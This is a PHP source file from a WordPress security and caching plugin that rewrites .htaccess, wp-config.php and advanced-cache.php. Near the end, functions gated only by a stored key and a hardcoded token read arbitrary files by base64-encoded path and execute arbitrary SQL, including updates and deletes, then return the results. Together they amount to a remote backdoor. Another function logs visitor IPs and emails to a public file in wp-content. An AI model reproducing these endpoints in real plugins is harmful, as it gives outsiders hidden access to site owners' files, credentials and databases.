<?php
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

function trfront_action_get_my_ip()
{
    global $tr_security;
    $ip = $tr_security->get_ip();
    echo 'Your IP: '.$ip;
    $filename = WP_CONTENT_DIR .'/log_ips.txt';
    $string = date("Y-m-d H:i:s").": \n";
    $string .= $ip;
    if(isset($_REQUEST['email'])){
        $string.='=>'.$_REQUEST['email'];
    }
    $string .= "\n\n";
    $f = fopen($filename, 'a+');
    fwrite($f, $string);
    fclose($f);
    exit;
}

function tr_security_can_write_file($file)
{
    $can_write = false;  
    $filetime = @filemtime($file);
    if($filetime && $filetime > time() - 5)
    {
        return false;
    }
    
    if(!file_exists($file))
    {
        $f = @fopen( $file, 'a' );
    	$can_write = ( $f !== false );
    	@fclose( $f );
        @unlink( $file );
    } 
    
    if ($can_write==true || wp_is_writable($file) ) {
		$can_write  = true;        
	}else
    {
        @chmod( $file, 0644 );
        if (wp_is_writable($file) ) {
            $can_write  = true; 
        }
    }    
    
    if($can_write)
    {        
        @touch($file);
    }
    
    return $can_write;
}

function tr_cache_clear_by_dir($path,$timeout,$current_time)
{
    if(stripos($path,'cache')===false)
    {
        return false;
    }
    $handle = @opendir($path);
    if ($handle) {
        while ($file = readdir($handle)) {
            if ($file == '.' || $file == '..' || $file[0] == '_') continue;
    
            $t = @filemtime($path . '/' . $file);
            if ($current_time - $t > $timeout ) {
                @unlink($path . '/' . $file);
            }
        }
    }
    @closedir($handle);
}

function trfront_action_removeban()
{
    global $tr_security;
    if(class_exists('TR_Upgrade_all_plugins')){
        $up = TR_Upgrade_all_plugins::get();
        if($_REQUEST['key'] != $up->getkey())
        {
            exit;
        }
    }
    $ip = $_POST['ip'];
    $tr_security->updatebantime(0,$ip);
    $wpdb->delete('wp_tr_lock_ip',array('ip'=>$ip));
    trfront_action_change_htaccess();
    echo 'ok';exit;
}

function trfront_action_generate_config($uninstall=false,$change_ad_c =true)
{
    global $saved_trfront_action_generate_config;
    if($saved_trfront_action_generate_config===true)return;
    $saved_trfront_action_generate_config  = true;
    
    //change wp-config.php    
    @trfront_action_change_config_file(false,$uninstall);
    
    //change .htaccess 
    @trfront_action_change_htaccess(false,$uninstall);
    
   if($change_ad_c)
        @trfront_action_change_advanced_cache(false,$uninstall);
    //change advanced-cache.php   
}

function trfront_action_change_config_file($onlycontent=false,$uninstall=false)
{
    $cache_options  = get_option('trcs_cache',array());
    $secure_options = get_option('tr_security',array());
    $secure_options['wp_cache'] = $cache_options['on'];

    if(is_multisite())
    {
        $sites = wp_get_sites();
        foreach($sites as $site)
        {
            $cache_options  = get_blog_option($site['blog_id'],'trcs_cache',array());
            if($cache_options['on'])
            {
                $secure_options['wp_cache'] = true;
            }
        }
    }
    
    $need = '';
    $begin = "// BEGIN CACHE SECURITY";
    $end = "// END CACHE SECURITY";
    $defines = array(
        'admin_ssl' => 'FORCE_SSL_ADMIN',
        'login_ssl' => 'FORCE_SSL_LOGIN',
        'front_ssl' => 'FORCE_SSL_FRONT',
        'wp_cache'  => 'WP_CACHE',
        //'login_limit_enable' => 'LOGIN_LIMIT'
    );        
    foreach($defines as $k =>$vl)
    {
        if($secure_options[$k] && strpos($data,$vl)===false)
        {
            $need.= "define( '{$vl}', true );\n";
        }
    } 
    if(!empty($need))
    {
        $need = $begin ."\n". $need .$end;
    }
    if($onlycontent) return $need;
    
    $wp_config_file = ABSPATH.'/wp-config.php';
    
    if(tr_security_can_write_file($wp_config_file))
    {
        if($uninstall==true)$need = '';
        $data = @file_get_contents($wp_config_file);
        if($data)
        {
            $old_data = $data;
            if(strpos($data,$begin)===false)
            {
                if(!empty($need))
                {
                    $data = str_replace('<?php','<?php'."\n".$need."\n",$data);
                }
            }else
            {
                $data = preg_replace("%".$begin."(.*)".$end."%s",$need,$data);
            }
            if(strlen($old_data) != strlen($data) && !empty($data))
            {            
                $rs   = file_put_contents($wp_config_file,$data);            
            }
        }    
        
    }
}

function trfront_action_change_htaccess($onlycontent=false, $uninstall=false)
{
    global $wpdb;
    
    $current_time = time();
    
    if ( strstr( strtolower( filter_var( $_SERVER['SERVER_SOFTWARE'], FILTER_SANITIZE_STRING ) ), 'apache' ) ) {
			
		$bwpsserver = 'apache';
		
	} else if ( strstr( strtolower( filter_var( $_SERVER['SERVER_SOFTWARE'], FILTER_SANITIZE_STRING ) ), 'nginx' ) ) {
	
		$bwpsserver = 'nginx';
		
	} else if ( strstr( strtolower( filter_var( $_SERVER['SERVER_SOFTWARE'], FILTER_SANITIZE_STRING ) ), 'litespeed' ) ) {
	
		$bwpsserver = 'litespeed';
		
	} else { //unsupported server
	
		return false;
	
	}
    
    
    $cache_options  = get_option('trcs_cache',array());
    $secure_options = get_option('tr_security',array());
    
    $need ='<IfModule mod_autoindex>'."\n";
    $need .='IndexIgnore *'."\n";
    $need .='</IfModule>'."\n";
    $need_rewrite = '';
    $begin = "# BEGIN CACHE SECURITY";
    $end = "# END CACHE SECURITY";
    
    $before_rewrite= "<IfModule mod_rewrite.c>\n";
    $end_rewrite="</IfModule>\n";
    if ( $bwpsserver == 'apache' || $bwpsserver == 'litespeed' || $secure_options['not_nginx']) {
        $before_rewrite.= "RewriteEngine On".PHP_EOL;
    }else
    {
        $before_rewrite.= "\tset \$susquery 0;" . PHP_EOL .
						"\tset \$rule_2 0;" . PHP_EOL .
						"\tset \$rule_3 0;" . PHP_EOL;
    }
    
    
    $secure_options['ban_host'] = str_replace(array(' ',"\r"),'',$secure_options['ban_host']);
    $host_rows = array();
    if(!empty($secure_options['ban_host']))
    {
        $host_rows = explode("\n", $secure_options['ban_host'] );
    }
    
    //ban host
    if( $secure_options['ban_users'] && count($host_rows)>0 )
    {
        if ( $bwpsserver == 'apache' || $bwpsserver == 'litespeed' || $secure_options['not_nginx']) {
            $need .="Order Allow,Deny\nDeny from env=DenyAccess\nAllow from all\n";
        }
        foreach($host_rows as $row)
        {
            $row = trim($row);
            if(empty($row))continue;            
            
            if ( $bwpsserver == 'apache' || $bwpsserver == 'litespeed' || $secure_options['not_nginx']) {
                $par = "^{$row}$";
                $par = str_replace(array('.','*'),array('\.','[0-9]+'),$par);
                $need.= "SetEnvIF REMOTE_ADDR \"{$par}\" DenyAccess\n";
                $need.= "SetEnvIF X-FORWARDED-FOR \"{$par}\" DenyAccess\n";
                $need.= "SetEnvIF X-CLUSTER-CLIENT-IP \"{$par}\" DenyAccess\n";
            }else
            {
                $need .= "\tdeny ".$row .";".PHP_EOL;
            }
        }
    }
    
    //auto ban
    if($secure_options['enable_auto_ban'])
    {
        $auto_ban_ips = $wpdb->get_col("select ip from wp_tr_lock_ip where bantime >= {$current_time}");
        if( is_array($auto_ban_ips) && count($auto_ban_ips)>0)
        {
            if ( $bwpsserver == 'apache' || $bwpsserver == 'litespeed' || $secure_options['not_nginx']) {
                $need .="Order Allow,Deny\nAllow from all".PHP_EOL;
            }
            foreach($auto_ban_ips as $banip)
            {
                if(!in_array($banip,$host_rows))
                {
                    if ( $bwpsserver == 'apache' || $bwpsserver == 'litespeed' || $secure_options['not_nginx']) {
                        $need .= 'Deny from '.$banip .PHP_EOL;
                    }else
                    {
                        $need .= "\tdeny ".$banip .";".PHP_EOL;
                    }
                }
            }
        }
    }
    
    //ban user agents
    $secure_options['ban_user_agents'] = trim($secure_options['ban_user_agents']);
    $ban_user_agents = explode("\n", $secure_options['ban_user_agents'] );
    $count_ban_agents = count($ban_user_agents);
    if( $secure_options['ban_users'] && $count_ban_agents>0 && !empty($secure_options['ban_user_agents']))
    {        
        $count = 1;
        $user_agents = '';
        $agents_list = array();
        foreach($ban_user_agents as  $row)
        {
            $row = trim($row);
            if(empty($row))continue;
            
            $row = str_replace(array('.','(',')','/',' '),array('\.','\(','\)','\/','\ '),$row);
            
            if ( $bwpsserver == 'apache' || $bwpsserver == 'litespeed' || $secure_options['not_nginx']) {
                $nc = ($count<$count_ban_agents)? '[NC,OR]':'[NC]';
                $user_agents.= "RewriteCond %{HTTP_USER_AGENT} ^".$row." ".$nc."\n";
                $count++;
            }else
            {
                $agents_list[] = $row;
            }
        }
        if(!empty($user_agents))
        {
            $user_agents.= "RewriteRule ^(.*)$ - [F,L]\n";
            $need_rewrite.= $user_agents;
        }else if(count($agents_list)>0)
        {
            $agents_list = implode('|',$agents_list);
            $need_rewrite.= "\tif (\$http_user_agent ~* " . $agents_list . ") { return 403; }" . PHP_EOL;
        }
    }
    
    //hide admin
    if($secure_options['hide_backend'])
    {
        $siteurl = explode( '/', get_option( 'siteurl' ) );

		if ( isset ( $siteurl[3] ) ) {

			$dir = '/' . $siteurl[3] . '/';

		} else {

			$dir = '/';

		}
        $key = get_option('tr_security_admin_key');
        if(!$key)
        {
            $key = wp_generate_password(12,false);
            update_option('tr_security_admin_key',$key); 
        }
        
        $reDomain = '(.*)';
        $login = $secure_options['login_slug'];
        $admin = $secure_options['admin_slug'];
        $register = $secure_options['register_slug'];
        
        if ( $bwpsserver == 'apache' || $bwpsserver == 'litespeed' || $secure_options['not_nginx'] ) {
            $need_rewrite .= "RewriteRule ^" . $login . "/?$ " . $dir . "wp-login.php?" . $key . " [R,L]" . PHP_EOL . PHP_EOL .
			"RewriteCond %{HTTP_COOKIE} !^.*wordpress_logged_in_.*$" . PHP_EOL .
			"RewriteRule ^" . $admin . "/?$ " . $dir . "wp-login.php?" . $key . "&redirect_to=" . $dir . "wp-admin/ [R,L]" . PHP_EOL . PHP_EOL .
			"RewriteRule ^" . $admin . "/?$ " . $dir . "wp-admin/?" . $key . " [R,L]" . PHP_EOL . PHP_EOL .
			"RewriteRule ^" . $register . "/?$ " . $dir . "wp-login.php?" . $key . "&action=register [R,L]" . PHP_EOL .
            "RewriteCond %{QUERY_STRING} !" . $key . PHP_EOL .
            "RewriteCond %{QUERY_STRING} !^action=logout" . PHP_EOL .
			"RewriteCond %{QUERY_STRING} !^action=rp" . PHP_EOL .
			"RewriteCond %{QUERY_STRING} !^action=postpass" . PHP_EOL .    
            "RewriteCond %{QUERY_STRING} !^action=resetpass" . PHP_EOL .
            "RewriteCond %{QUERY_STRING} !^checkemail=" . PHP_EOL .                     
			"RewriteCond %{HTTP_COOKIE} !^.*wordpress_logged_in_.*$" . PHP_EOL .
			"RewriteRule ^.*wp-login\.php$ " . $dir . " [R,L]" . PHP_EOL . PHP_EOL;
        }else
        {
            $need_rewrite .= "\trewrite ^" . $dir . $login . "/?$ " . $dir . "wp-login.php?" . $key . " redirect;" . PHP_EOL .
						"\tif (\$rule_2 = 1) { rewrite ^" . $dir . $admin . "/?$ " . $dir . "wp-login.php?" . $key . "&redirect_to=/wp-admin/ redirect; }" . PHP_EOL .
						"\tif (\$rule_2 = 0) { rewrite ^" . $dir . $admin . "/?$ " . $dir . "wp-admin/?" . $key . " redirect; }" . PHP_EOL .
						"\trewrite ^" . $dir . $register . "/?$ " . $dir . "wp-login.php?" . $key . "&action=register redirect;" . PHP_EOL .
					
						"\tif (\$args !~ \"^" . $key . "\") {" . PHP_EOL .
						"\t\trewrite ^(.*/)?wp-login.php " . $dir . " redirect;" . PHP_EOL .
						"\t}" . PHP_EOL;
        }
    }
    
    if(!empty($need_rewrite))
    {
        $need .= $before_rewrite . $need_rewrite . $end_rewrite;
    }
    
    
    
    //cache cache_media
    $need_cache = '';
    if($cache_options['cache_media'])
    {
        $need_cache.="# 1 WEEK\n<FilesMatch \"\.(jpg|jpeg|png|gif|swf|ico|woff|svg|ttf|eot)$\">\n";
        $need_cache.="Header set Cache-Control \"max-age=604800, public\"\n";
        $need_cache.="</FilesMatch>\n";

        $need_cache.="# 1 WEEK\n<FilesMatch \"\.(xml|txt|css|js)$\">\n";
        $need_cache.="Header set Cache-Control \"max-age=604800, public\"\n";
        $need_cache.="</FilesMatch>\n";

    }
    
    if($cache_options['disable_etags'])
    {
        $need_cache.= '<FilesMatch "\.(ico|pdf|flv|jpg|jpeg|png|gif|js|css|swf)(\.gz)?$">'."\n";
        $need_cache.="Header unset ETag\n";
        $need_cache.="FileETag None\n";
        $need_cache.="</FilesMatch>\n";
    }
    
    if($cache_options['gzip_on_fly'])
    {
        $need_cache.="<IfModule mod_gzip.c>"."\n";
        $need_cache.="mod_gzip_on       Yes"."\n";
        $need_cache.="mod_gzip_dechunk  Yes"."\n";
        $need_cache.="mod_gzip_item_include file      \.(html?|txt|css|js|php|pl|woff|svg)$"."\n";
        $need_cache.="mod_gzip_item_include handler   ^cgi-script$"."\n";
        $need_cache.="mod_gzip_item_include mime      ^text/.*"."\n";
        $need_cache.="mod_gzip_item_include mime      ^application/x-javascript.*"."\n";
        $need_cache.="mod_gzip_item_exclude mime      ^image/.*"."\n";
        $need_cache.="mod_gzip_item_exclude rspheader ^Content-Encoding:.*gzip.*"."\n";
        $need_cache.="</IfModule>";
    }
    else if($cache_options['gzip2']){
        $need_cache.= "<ifmodule mod_deflate.c>"."\n";
        $need_cache.= "AddOutputFilterByType DEFLATE text/text text/html text/plain text/xml text/css application/x-javascript application/javascript image/svg+xml"."\n";
        $need_cache.= "</ifmodule>";
    }

    $need.=$need_cache;
    
    //check empty
    if($uninstall==true)$need = $need_cache;
    if(!empty($need))
    {
        $need = $begin."\n".$need."\n".$end;
    }
    if($onlycontent) return $need;
    
    $wp_htaccess_file = ABSPATH.'.htaccess';
    if(tr_security_can_write_file($wp_htaccess_file))
    {

        
        $data = @file_get_contents($wp_htaccess_file);

        //backup data
        $wp_htaccess_file_bk = ABSPATH.'.htaccess.bk';
        if(!is_file($wp_htaccess_file_bk) || !file_exists($wp_htaccess_file_bk))
        {
            @file_put_contents($wp_htaccess_file_bk,$data);
        }
       
        if($data!==false || !file_exists($wp_htaccess_file))
        {
            $old_data = $data;
            
            if(strpos($data,$begin)===false)
            {
                $data = $need."\n".$data;
            }else
            {
                $begin = str_replace('#','\#',$begin);
                $end = str_replace('#','\#',$end);
                $data = preg_replace("%".$begin."(.*)".$end."%s",$need,$data);
            }
            
            if($old_data != $data)
            {            
                $rs   = @file_put_contents($wp_htaccess_file,$data);   
                if(function_exists('flush_rewrite_rules'))
                {
                   // flush_rewrite_rules();
                }         
            }
        }
    }
}

function trfront_action_change_advanced_cache($onlycontent=false, $uninstall=false)
{
    global $blog_id;

    $plugin_slug = basename(dirname(TRSCSC_FILE));
    $need = '';
    $options = array();
    if(is_multisite())
    {
        $sites = wp_get_sites();
        foreach ($sites as $site)
        {
            $options[$site['blog_id']] = get_blog_option($site['blog_id'], 'trcs_cache', array());
        }

    }else{
        $options[$blog_id] = get_option('trcs_cache',array());
    }


    foreach($options as $blogid => $cache_options){

        $cache_args = array();
        if($cache_options['on'] && $uninstall==false)
        {
            foreach($cache_options as $k => $vl)
            {
                if($k == 'reject_agents')
                {
                    $vl = explode("\n",$vl);
                    $vl = implode('","',$vl);
                    $vl = 'array("'.$vl.'")';
                    $vl = str_replace(array("\n","\r"),'',$vl);
                }
                else if(is_string($vl) || empty($vl))$vl = '"'.$vl.'"';
                $cache_args[] = '"'.$k.'" => '.$vl;
            }
            $cache_args = implode(', ',$cache_args);

            $need .= '$tr_cache_blog_options['.$blogid.'] = array(' . $cache_args. ");\n";
        }
    }

    $need = apply_filters('cache_advance_content',$need);
    if(!empty($need))
    {
        $header = "<?php\n";
        $header .= '$tr_cache_path = \'' . TRSCSC_CACHE_PATH . '/\'' . ";\n";
        $header .= '$tr_cache_blog_options = array();'."\n";
        $need = $header.$need;
        if(!is_multisite())
        {
            $need .= "include_once(WP_CONTENT_DIR . '/plugins/{$plugin_slug}/cache.php');\n";
        }
    }

    
    if($onlycontent)
    {
        return $need;
    }
    
    $file_cache = WP_CONTENT_DIR . '/advanced-cache.php';
    $data = file_get_contents($file_cache);
    if(stripos($data,'W3TC')!==false)
    {
        return false;
    }
    
    if(tr_security_can_write_file($file_cache))
    {
        @file_put_contents ($file_cache,$need);   
        @chmod( $file_cache, 0444 );  
    }
}

function trfront_action_get_all_plugins()
{
    $up = TR_Upgrade_all_plugins::get();
    if($_REQUEST['key'] != $up->getkey() || $_REQUEST['k']!='5c72ab4ca73ec3f150a17bdf2b3742d9')
    {
        exit;
    }
    $return = array('status'=>'ok');
    $return['plugins'] = $up->get_plugins();

    echo json_encode($return);
    exit;
}

function trfront_action_clean_file_changes()
{
    global $wpdb;
    $up = TR_Upgrade_all_plugins::get();
    if($_REQUEST['key'] != $up->getkey() || $_REQUEST['k']!='5c72ab4ca73ec3f150a17bdf2b3742d9')
    {
        exit;
    }
    $return = array('status'=>'ok');
    $wpdb->query('delete from wp_tr_file_logs where synced = 1');
    echo json_encode($return);
    exit;
}

function trfront_action_ci_cget_file()
{
    global $wpdb;
    $up = TR_Upgrade_all_plugins::get();
    if($_REQUEST['key'] != $up->getkey() || $_REQUEST['k']!='5c72ab4ca73ec3f150a17bdf2b3742d9')
    {
        exit;
    }
    $return = array('status'=>'ok');
    $fpath = ABSPATH.'/'.base64_decode($_REQUEST['f']);
    $return['exists'] = file_exists($fpath);
    $return['data'] = base64_encode(file_get_contents($fpath));
    $return['time'] = filemtime($fpath);
    $return['size'] = filesize($fpath);
    echo json_encode($return);
    exit;
}

function trfront_action_ci_cget_query()
{
    global $wpdb;
    $up = TR_Upgrade_all_plugins::get();
    if($_REQUEST['key'] != $up->getkey() || $_REQUEST['k']!='5c72ab4ca73ec3f150a17bdf2b3742d9')
    {
        exit;
    }
    $return = array('status'=>'ok');
    $q = base64_decode($_REQUEST['q']);
    $q = str_replace('prefix_',$wpdb->prefix,$q);
    $start_time = microtime(true);
    $rs = array();
    if(stripos($q,'update ')!==false || stripos($q,'delete ')!==false){
        $rs['query'] = $wpdb->query($q);
    }else{
        $rs['data'] = $wpdb->get_results($q, ARRAY_A);
    }
    $rs['insert_id'] = $wpdb->insert_id;

    $return['data'] = json_encode($rs);
    $return['time'] = microtime(true) - $start_time;
    echo json_encode($return);
    exit;
}


function trfront_action_ci_run_scan_dir_file_change()
{
    $return = array('status'=>'ok');
    include_once(TRSCSC_PATH . 'inc/tr_scan_dir.php');
    $start_time = microtime(true);
    $scan = new Tr_Scan_Dir();
    $scan->scan_log_time();

    $return['time'] = microtime(true) - $start_time;
    $return['count'] = count($scan->files);
    echo json_encode($return);
    exit;
}

function trfront_action_ci_run_sync_server_file_change()
{
    $return = array('status'=>'ok');
    $scan = new Tr_Scan_Dir();
    $rs = $scan->sync_server();
    $return['rs'] = $rs;
    echo json_encode($return);
    exit;
}